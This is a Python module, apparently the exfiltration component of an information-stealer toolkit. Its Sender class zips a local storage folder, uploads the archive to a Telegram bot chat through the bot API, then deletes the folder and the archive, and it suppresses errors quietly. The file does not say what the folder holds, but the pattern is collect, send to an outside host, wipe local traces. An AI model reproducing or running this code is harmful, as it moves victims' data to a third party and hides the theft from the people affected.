from os import remove, path
from shutil import make_archive, rmtree
from urllib.request import Request, urlopen

from ..helpers.config import SenderConfig
from ..helpers import MultipartFormDataEncoder


class Sender:

    def __init__(self, zip_name: str, storage_path: str, token: str, user_id: int, errors: bool):

        self.config = SenderConfig()

        self.zip_name = zip_name
        self.storage_path = storage_path
        self.token = token
        self.user_id = user_id
        self.errors = errors

    def __create_archive(self):

        make_archive(rf"{path.dirname(self.storage_path)}\{self.zip_name}", "zip", self.storage_path)

    def __send_archive(self):

        with open(rf"{path.dirname(self.storage_path)}\{self.zip_name}.zip", "rb") as file:

            content_type, body = MultipartFormDataEncoder().encode(
                [("chat_id", self.user_id)],
                [("document", f"{self.zip_name}.zip", file)]
            )

            query = Request(
                method="POST",
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data=body
            )

            query.add_header("User-Agent", self.config.UserAgent)
            query.add_header("Content-Type", content_type)

            urlopen(query)

        file.close()

    def __delete_files(self):

        rmtree(self.storage_path)
        remove(rf"{path.dirname(self.storage_path)}\{self.zip_name}.zip")

    def run(self):

        try:

            self.__create_archive()
            self.__send_archive()
            self.__delete_files()

        except Exception as e:
            if self.errors is True: print(f"[Sender]: {repr(e)}")
